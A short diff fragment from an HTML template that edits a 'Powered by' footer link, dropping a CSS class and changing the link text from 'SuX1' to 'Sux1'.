-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" >SuX1</a></div>
+  <div class="powered-by">Powered by <a target="_blank" >Sux1</a></div>
 
 
 
